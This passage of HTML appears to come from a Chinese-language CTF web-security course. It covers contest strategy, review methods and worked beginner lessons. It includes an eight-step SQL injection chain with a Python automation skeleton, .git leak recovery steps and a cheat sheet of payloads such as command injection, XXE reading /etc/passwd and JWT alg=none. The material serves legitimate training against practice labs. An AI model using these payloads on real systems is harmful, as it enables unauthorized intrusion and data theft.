+<div class="tablewrap"><div class="tcap">按「页面现象」列清单</div><table><thead><tr><th>你看到的</th><th>意味着</th></tr></thead><tbody><tr><td>报错里出现 SQL 关键字</td><td>SQLi（报错注入优先）</td></tr><tr><td>页面回显我输入的内容</td><td>XSS（反射）/ SSTI</td></tr><tr><td>能下载文件、路径可猜</td><td>路径穿越 / 任意文件读取</td></tr><tr><td>有「加载远程图片/URL 预览」</td><td>SSRF</td></tr><tr><td>有「记住我」「token」</td><td>JWT / 反序列化</td></tr><tr><td>有「验证码」</td><td>复用 / 爆破 / 前端绕过</td></tr><tr><td>价格、数量、积分能改</td><td>逻辑漏洞</td></tr><tr><td>URL 里有 id 且能看别人数据</td><td>水平越权</td></tr><tr><td>响应里出现 base64 大串</td><td>JWT / 序列化数据 / 编码套娃</td></tr><tr><td>页面里引用了 /static/ 或 .map 文件</td><td>前端源码泄露（source map）</td></tr></tbody></table></div>
+<blockquote class="note">💡 这两张表最好手抄一遍。手抄的过程中你会自然记住「哪里该试什么」，比读十遍有用。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>User-Agent 为什么也可能有注入点？</li><li>「有记住我」为什么提示去看 JWT？</li><li>页面回显输入内容，为什么既可能是 XSS 也可能是 SSTI？</li><li>看到 base64 大串，先做什么？</li></ol>
+</article>
+<article id="l-p7l4">
+<h2>卡住了怎么办：五种破局</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>建立「卡住不等于不会」的处理流程，并学会用时间盒管理自己。</p></div>
+<div class="tablewrap"><div class="tcap">五种破局手段</div><table><thead><tr><th>症状</th><th>动作</th><th>为什么有效</th></tr></thead><tbody><tr><td>完全没思路</td><td>回头补信息</td><td>大概率是信息没收集全：再扫目录、再读 JS、再读题面</td></tr><tr><td>参数试不通</td><td>换输入位置</td><td>很多题的过滤只做了 GET，换成 POST / Cookie / Header 就过了</td></tr><tr><td>不知道怎么拿 flag</td><td>反向思考</td><td>想要 flag 需要什么能力？倒推哪个漏洞能提供这个能力</td></tr><tr><td>利用链差一步</td><td>降维验证</td><td>先确认「这里有没有问题」（如猜对一位长度），再想自动化</td></tr><tr><td>实在卡死</td><td>按纪律看 WriteUp</td><td>只看「第一步从哪入手」，然后关掉自己继续做</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">时间盒规则（很重要） · text</div><pre><code>单个方向：最多 15 分钟
+单道题：  最多 60 分钟（入门阶段）
+超时 → 记下当前思路，换题或看提示
+
+卡住 30 分钟以上的最大原因不是难，
+而是「在错误的方向上反复试同一件事」。</code></pre></div>
+<h3>卡住时的三分钟自检</h3>
+<ol class="steps"><li>我试过的方向，是不是都属于同一类漏洞？（如果是，换一个大类）</li><li>我是不是在同一个参数上反复改，而没有换输入位置？</li><li>我能不能用自己的话说出「这题到底要什么」？（说不出来就回去读题面）</li><li>我把当前进度记下来了吗？（记下来，才敢放下）</li></ol>
+<blockquote class="note">💡 「换个方向」不等于放弃。你的目标是学会这一类题，不是死磕这一道。做完复盘，这道题的收益才算拿到。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么「换输入位置」常常有效？</li><li>时间盒规则解决什么问题？</li><li>看 WriteUp 的正确纪律是什么？</li><li>卡住时自检的第一个问题是什么？</li></ol>
+</article>
+<article id="l-p7l5">
+<h2>WriteUp 六问复盘法</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>每道题都能转化成可复用的知识，而不是「做过了」。</p></div>
+<p>做完题（或看完 WriteUp）后，强迫自己回答六个问题，写进本页底部的「我的笔记」——那里就是你的复盘本。</p>
+<div class="tablewrap"><div class="tcap">六问：问什么、为什么问</div><table><thead><tr><th>#</th><th>问题</th><th>为什么必须回答</th></tr></thead><tbody><tr><td>1</td><td>漏洞为什么会出现？（哪一行、哪个错误假设）</td><td>决定你能不能在新题里认出同一个错误</td></tr><tr><td>2</td><td>用户输入经过了哪些处理？</td><td>过滤漏在哪，就是你下次的绕过点</td></tr><tr><td>3</td><td>payload 每一部分有什么作用？</td><td>拆不开 payload = 换个环境就不会</td></tr><tr><td>4</td><td>为什么其他尝试没成功？</td><td>决定你下一次该先试什么，避免重复劳动</td></tr><tr><td>5</td><td>开发者应该怎么修？</td><td>修复思路比利用更能说明你理解了原理</td></tr><tr><td>6</td><td>换个环境还成立吗？</td><td>区分「这道题特有」与「通用原理」</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">复盘模板（直接抄进笔记） · text</div><pre><code>## 题目：____（平台 / 题目名 / 类型）
+
+1. 漏洞原理：
+   ____（一句话：输入从哪来，被当成了什么）
+
+2. 输入处理：
+   ____（有无过滤；过滤做了什么；哪一步漏了）
+
+3. payload 拆解：
+   ____（逐段说明作用）
+
+4. 失败尝试：
+   ____（试了什么；为什么不行）
+
+5. 修复方式：
+   ____（代码层怎么改）
+
+6. 可迁移性：
+   ____（下次遇到什么特征就该想到它）</code></pre></div>
+<blockquote class="note">💡 只收藏 WriteUp 会产生「我好像会了」的错觉。用自己的语言复述原理，才是真正理解的开始。<b>建议本课程中心的「我的笔记」就是你的复盘本。</b></blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>六问里哪一问最能区分「真懂」和「假懂」？</li><li>为什么「修复思路」也要写？</li><li>「可迁移性」这一问怎么用？</li><li>你打算把复盘写在哪？</li></ol>
+</article>
+<article id="l-p7l6">
+<h2>比赛策略与赛前清单</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道比赛里怎么分配时间、怎么避免低级失误，并有一张赛前一晚能照着过的清单。</p></div>
+<div class="tablewrap"><div class="tcap">时间分配（以 4 小时赛为例）</div><table><thead><tr><th>阶段</th><th>时长</th><th>做什么</th></tr></thead><tbody><tr><td>开局</td><td>0–10 分钟</td><td>把所有题扫一遍，按「看上去会」排序</td></tr><tr><td>热身</td><td>10–40 分钟</td><td>先拿 1–2 道低分题，建立手感</td></tr><tr><td>主攻</td><td>40–150 分钟</td><td>攻中档题；单题超过 40 分钟没进展就换</td></tr><tr><td>查漏</td><td>150–180 分钟</td><td>回头处理卡住的题，或补环境问题</td></tr><tr><td>收尾</td><td>最后 30 分钟</td><td>确认 flag 已提交、WriteUp 素材已保存</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">赛前检查清单 · text</div><pre><code>环境
+[ ] Burp / Yakit 能正常抓 HTTPS
+[ ] 浏览器代理插件配置好
+[ ] Python + requests 可用
+[ ] 常用字典、脚本目录就绪
+[ ] 网络稳定（VPN/代理确认）
+
+知识
+[ ] SQLi / XSS / 文件类 / SSRF 的基本 payload 能默写
+[ ] 知道怎么快速判断技术栈
+[ ] 记得决策树（p7l2）
+
+心态
+[ ] 允许自己卡住
+[ ] 卡住就换题，不较劲</code></pre></div>
+<blockquote class="note">💡 多人队伍里最重要的一条：<b>随时同步「我在试什么、结果如何」</b>。三个人各打各的，等于一个人打三遍。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么开局要先扫一遍所有题？</li><li>40 分钟规则的目的是什么？</li><li>赛前你最该检查的环境项是哪几个？</li><li>多人队伍里最容易犯的错是什么？</li></ol>
+</article></section>
+<section class="mod" id="m-p8"><h1>PART 10 · 实战复盘</h1><div class="sub">第 20–22 周 · 4 节</div><blockquote class="note">把前面 10 个 PART 串起来，用真实题目跑一遍完整流程。这一 PART 不提供答案，提供的是「你自己能走完一遍」的路径。</blockquote><article id="l-p8l1">
+<h2>入门题精讲：信息泄露类</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>用完整流程解一道信息泄露题，把「七件事起手式」真正走一遍。</p></div>
+<p>本节不提供题目环境，请用 CTFHub 的「信息泄露」专项自己做，再对照下面的流程检查自己的动作。</p>
+<div class="tablewrap"><div class="tcap">线索 → 动作对照</div><table><thead><tr><th>题面线索</th><th>立刻想到</th><th>具体动作</th></tr></thead><tbody><tr><td>备份文件 / 网站源码</td><td>www.zip、web.zip、index.php.bak</td><td>直接猜文件名下载</td></tr><tr><td>版本控制 / Git</td><td>.git/ 泄露</td><td>curl /.git/config → GitHack 还原</td></tr><tr><td>编辑器 / 临时文件</td><td>.index.php.swp、~ 结尾</td><td>下载后用 vim -r 恢复</td></tr><tr><td>robots / 爬虫协议</td><td>隐藏路径</td><td>读 robots.txt 里的 Disallow</td></tr><tr><td>源码里有数据库配置</td><td>弱口令 / 未授权</td><td>连数据库或从源码里直接读 flag</td></tr><tr><td>响应头暴露版本</td><td>框架已知漏洞</td><td>按版本搜公开利用</td></tr></tbody></table></div>
+<ol class="steps"><li>先读题面：如果题名/描述提到「备份」「源码」「Git」，直接从对应文件名猜起，不要先扫目录。</li><li>试 <code>/robots.txt</code>、<code>/.git/config</code>、<code>/www.zip</code>、<code>/index.php.bak</code> 四个请求。</li><li>拿到源码后先全局搜 <code>flag</code>、<code>password</code>、<code>key</code>、<code>host</code>，再看路由。</li><li>如果拿到的是 .git，还原后看 <code>git log --all</code>——flag 常在「已经被删掉」的提交里。</li><li>把每一步的结论写进笔记：哪个动作命中了、耗时多少。</li></ol>
+<blockquote class="note">💡 信息泄露题往往「十分钟内解决」，收益极高。养成习惯：<b>每道题都先花两分钟做一次信息收集</b>，再决定要不要深入。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · 信息泄露</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>这道题你从哪个线索入手的？为什么选它？</li><li>目录扫描字典里你最该加哪些后缀？</li><li>拿到源码后，你第一眼搜什么？</li></ol>
+</article>
+<article id="l-p8l2">
+<h2>入门题精讲：SQL 注入全流程</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>从判断注入到拿到数据，完整走一遍，并把它写成可复用的脚本。</p></div>
+<div class="code"><div class="cbar">完整链路（八步） · text</div><pre><code>① 判断：id=1' 报错 -&gt; 有注入
+② 字段数：order by 1..N 直到报错
+③ 显位：union select 1,2,3（前缀用 -1）
+④ 库名：database()
+⑤ 表名：information_schema.tables
+⑥ 列名：information_schema.columns
+⑦ 数据：group_concat(username,0x3a,password)
+⑧ 若字符被过滤：用 hex / char() / 盲注脚本</code></pre></div>
+<div class="tablewrap"><div class="tcap">每一步的判断标准</div><table><thead><tr><th>步骤</th><th>怎么判断成功</th><th>失败怎么办</th></tr></thead><tbody><tr><td>① 判断注入</td><td>单引号报错 / 真假响应不同</td><td>换 \ / ) / " 闭合符；换 POST</td></tr><tr><td>② 字段数</td><td>order by N 报错，N-1 是字段数</td><td>从 1 二分/逐个试到 20</td></tr><tr><td>③ 找显位</td><td>页面出现 1 2 3 中的数字</td><td>检查是否被过滤，改用报错注入</td></tr><tr><td>④⑤⑥ 元数据</td><td>出现库名/表名/列名</td><td>确认 information_schema 可用（MySQL）</td></tr><tr><td>⑦ 取数据</td><td>出现目标字段值</td><td>字段被过滤就用 hex/char 拼接</td></tr><tr><td>⑧ 绕过</td><td>payload 能执行</td><td>见 p5l4 的 WAF 绕过表</td></tr></tbody></table></div>
+<p>做完后，用 PART 4 学的 requests 写一个脚本，把 ①~⑦ 自动化。这一步是「从会做到会写工具」的分水岭——以后同类题改个 URL 就能复用。</p>
+<div class="code"><div class="cbar">把它写成脚本（骨架） · python</div><pre><code>import requests
+
+BASE = "http://target/"
+
+def q(payload):
+    return requests.get(BASE, params={"id": payload}, timeout=10).text
+
+# 1) 判断字段数
+for n in range(1, 21):
+    r = q(f"1 order by {n} -- ")
+    if "error" in r.lower() or "报错" in r:
+        print("字段数 =", n - 1); break
+
+# 2) 取库名（假设显位是第 2 列）
+print(q("0 union select 1,database(),3 -- "))
+
+# 3) 取表名 → 列名 → 数据（照同样结构替换 SQL 即可）</code></pre></div>
+<blockquote class="note">💡 把脚本存下来。以后遇到同类题，改个 URL 就能复用——这就是你自己积累的工具库。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/skyous/sqli-labs" target="_blank" rel="noopener">SQLi-Labs Less-1 ~ Less-7</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>哪一步最容易卡住？为什么？</li><li>你的脚本里怎么处理「响应里没有显位」的情况？</li><li>为什么要把流程写成脚本？</li></ol>
+</article>
+<article id="l-p8l3">
+<h2>综合复盘：把学过的压成一张表</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>产出一份属于你自己的「漏洞速查表」，并找出自己的薄弱点。</p></div>
+<p>下面是一张空表模板，请你按自己的理解填（可以先把本页的表格「复制」到笔记，再逐行填）。填不出来的行，就是你下一步该补的模块。</p>
+<div class="tablewrap"><div class="tcap">漏洞速查表（模板）</div><table><thead><tr><th>漏洞</th><th>入口特征</th><th>判断方法</th><th>典型 payload</th><th>修复</th></tr></thead><tbody><tr><td>SQL 注入</td><td>?id= 数字</td><td>单引号报错 / 真假差异</td><td>union select / sleep()</td><td>参数化查询</td></tr><tr><td>XSS</td><td>输入被回显</td><td>输入 <b>alert(1)</b> 看是否执行</td><td>img onerror</td><td>按上下文转义 + CSP</td></tr><tr><td>文件上传</td><td>有 upload 表单</td><td>传 php 看是否被解析</td><td>.htaccess / 图片马</td><td>白名单 + 重命名 + 禁执行</td></tr><tr><td>文件包含</td><td>?page= / ?file=</td><td>传 ../../ 看报错</td><td>php://filter</td><td>白名单路径映射</td></tr><tr><td>SSRF</td><td>?url= / ?image=</td><td>传 DNSLog 看回连</td><td>127.0.0.1 / gopher</td><td>协议 + IP 白名单 + 禁跳转</td></tr><tr><td>命令执行</td><td>?cmd= / ?exec=</td><td>传 ;whoami</td><td>cat$IFS/flag</td><td>不用 shell / 白名单</td></tr><tr><td>反序列化</td><td>参数像序列化串 / base64</td><td>改长度看报错</td><td>pop 链 / phpggc</td><td>不接受外部序列化数据</td></tr><tr><td>SSTI</td><td>{{7*7}} 回显 49</td><td>数学表达式探测</td><td>__class__ 链</td><td>用户输入只当变量</td></tr><tr><td>XXE</td><td>接受 XML</td><td>实体引用读文件</td><td>file:///etc/passwd</td><td>禁用 DTD / 外部实体</td></tr><tr><td>JWT</td><td>三段 base64</td><td>解 payload 看角色</td><td>alg=none / 弱密钥</td><td>固定算法 + 强密钥</td></tr><tr><td>越权</td><td>?id= 能看别人数据</td><td>改 id 重放</td><td>水平/垂直越权</td><td>从 session 取用户身份</td></tr></tbody></table></div>
+<ol class="steps"><li>只看「入口特征」和「判断方法」两列，能不能反过来想起漏洞名？</li><li>把「典型 payload」默写一遍，写不出的标记出来。</li><li>把「修复」列遮住，自己说一遍防御思路。</li><li>把标记出来的行整理成「下周要补的 3 件事」。</li></ol>
+<blockquote class="note">💡 手写一遍比复制强十倍。写完你会发现自己对某些列「填不出来」——那些就是你的薄弱点。<b>这张表就是你以后做题时翻的东西。</b></blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>表里哪一列你填得最吃力？那就是下一个要补的模块。</li><li>为什么「修复」这一列也要写？</li><li>你的「下周要补的 3 件事」是什么？</li></ol>
+</article>
+<article id="l-p8l4">
+<h2>下一阶段：如何持续进步</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道课程结束后该往哪走，并把「持续」变成一套可执行的机制。</p></div>
+<div class="tablewrap"><div class="tcap">三个阶段的目标</div><table><thead><tr><th>阶段</th><th>时间</th><th>目标</th><th>衡量方式</th></tr></thead><tbody><tr><td>打基础</td><td>现在–3 个月</td><td>走完零基础 10 节 + PART 1–4</td><td>能独立起服务、改包、读 JS</td></tr><tr><td>能做题</td><td>3–9 个月</td><td>PART 7 / 8 共十八节能独立复现</td><td>新手题 10 分钟内判断题型</td></tr><tr><td>能比赛</td><td>9–18 个月</td><td>打完整一场比赛并复盘</td><td>有 WriteUp、有 payload 库、有稳定节奏</td></tr></tbody></table></div>
+<ul><li><b>固定刷题节奏</b>：每周 2–3 道，重点在复盘而不是数量。</li><li><b>建立自己的 payload 库</b>：按漏洞分类，每条注明适用条件。</li><li><b>写 WriteUp</b>：公开发布会倒逼你写清楚原理。</li><li><b>跟进组件漏洞</b>：Java 生态（Shiro/Fastjson/Log4j）与 PHP 生态（ThinkPHP/Laravel）的版本漏洞。</li><li><b>参加比赛</b>：MoeCTF、NSSCTF、CTFHub 的周赛都是好起点。</li></ul>
+<blockquote class="note">💡 半年能到达的合理目标是：看到一道基础 Web 题，能在 10 分钟内判断题型并列出尝试顺序。<b>这已经超过大多数新手了。</b>至于以后走渗透、应用安全还是主机安全，见 p2b5「三类岗位」那张表——方向不同，重点不同。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>你打算用什么节奏继续刷题？写进日历。</li><li>你的 payload 库准备怎么组织？</li><li>「能做题」阶段的衡量标准是什么？</li><li>半年后你希望自己能做到哪件事？</li></ol>
+</article></section>
+</main>
+</div>
+</body>
+</html>
